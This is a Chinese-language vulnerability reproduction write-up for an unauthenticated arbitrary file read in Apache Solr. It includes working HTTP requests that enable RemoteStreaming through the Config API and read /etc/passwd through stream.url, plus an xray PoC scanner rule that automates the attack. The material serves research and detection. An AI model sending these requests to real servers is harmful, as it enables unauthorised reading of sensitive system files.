## 一、简介

Apache Solr是一个开源搜索服务引擎，Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。Apache-Solr任意文件读取漏洞漏洞，攻击者可以在未授权的情况下读取目标服务器敏感文件和相关内容。

漏洞利用需要两步，首先利用Config
API打开默认关闭的requestDispatcher.requestParsers.enableRemoteStreaming开关，然后进行文件读取。

值得注意的是，默认情况下requestDispatcher.requestParsers.enableRemoteStreaming是关闭，攻击者并不能进行任意文件读取。

## 二、影响版本

Apache Solr <= 8.8.1(最新版，目前官方以RemoteStreaming默认关闭为由拒绝修复...但是可以通过config接口开启)

## 三、漏洞复现

手动搭建环境：http://archive.apache.org/dist/lucene/solr/

也可以使用vulhub的任意solr漏洞环境：https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193

开始复现：

  1. 获取core名称。 /solr/admin/cores?wt=json

    
    
    GET /solr/admin/cores?wt=json HTTP/1.1
    Host: 127.0.0.1:8983
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
    Connection: close
    

![image](https://image.3001.net/images/20200701/1593550745.png!small)

[![image](https://image.3001.net/images/20200701/1593550745.png!small)image774×576
53.5
KB](https://forum.0-sec.org/uploads/default/original/2X/2/23c8cca35c3f9fe16ffb408cf18689918aa66316.png)

  1. 通过solr config 的接口启用RemoteStreaming

    
    
    POST /solr/test/config HTTP/1.1
    Host: 127.0.0.1:8983
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
    Content-Length: 80
    Content-Type: application/json
    Connection: close
    
    {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
    

[![image](https://image.3001.net/images/20200701/1593550745.png!small)image1172×208
30.2
KB](https://forum.0-sec.org/uploads/default/original/2X/e/e3c45845783ed95b9222bc5009a162dab120633a.png)

[![image](https://image.3001.net/images/20200701/1593550745.png!small)image1376×266
14.2
KB](https://forum.0-sec.org/uploads/default/original/2X/c/c179c574a93cc8026702ea1da478f74195dc50df.png)

  1. 通过stream.url 实现任意文件读取。

    
    
    POST /solr/test/debug/dump?param=ContentStreams HTTP/1.1
    Host: 127.0.0.1:8983
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
    Content-Length: 29
    Content-Type: application/x-www-form-urlencoded
    Connection: close
    
    stream.url=file:///etc/passwd
    

[![image](https://image.3001.net/images/20200701/1593550745.png!small)image1276×268
31.9
KB](https://forum.0-sec.org/uploads/default/original/2X/5/57e7fc10f26c1e182862dcc60d5d1a941ffc7a16.png)

[![image](https://image.3001.net/images/20200701/1593550745.png!small)image2040×554
99.1
KB](https://forum.0-sec.org/uploads/default/original/2X/2/2bd33e44d5c68175390df5cf871342eb04ecf67e.png)

这里附上我写的xray 检测规则

    
    
    name: poc-yaml-solr-any-file-read
    groups:
      linux:
        - method: GET
          path: /solr/admin/cores?wt=json
          follow_redirects: false
          expression: response.status == 200 && response.body.bcontains(b"responseHeader")
          search: '"name":"(?P<core>.*?)"'
        - method: POST
          path: >-            /solr/{{core}}/config
          headers:
            Content-Type: application/json
          body: |-            {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
          follow_redirects: false
          expression: response.status == 200 && response.body.bcontains(bytes("\"status\":0")) && response.body.bcontains(bytes("responseHeader"))
        - method: POST
          path: >-            /solr/{{core}}/debug/dump?param=ContentStreams
          headers:
            Content-Type: application/x-www-form-urlencoded
          body: |-            stream.url=file:///etc/passwd
          follow_redirects: false
          expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
      windows:
        - method: GET
          path: /solr/admin/cores?wt=json
          follow_redirects: false
          expression: response.status == 200 && response.body.bcontains(b"responseHeader")
          search: '"name":"(?P<core>.*?)"'
        - method: POST
          path: >-            /solr/{{core}}/config
          headers:
            Content-Type: application/json
          body: |-            {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
          follow_redirects: false
          expression: response.status == 200 && response.body.bcontains(bytes("\"status\":0")) && response.body.bcontains(bytes("responseHeader"))
        - method: POST
          path: >-            /solr/{{core}}/debug/dump?param=ContentStreams
          headers:
            Content-Type: application/x-www-form-urlencoded
          body: |-            stream.url=file:///c://windows/win.ini
          follow_redirects: false
          expression: |
            response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
    detail:
      author: jweny(https://github.com/jweny)
      links:
        - https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ
    

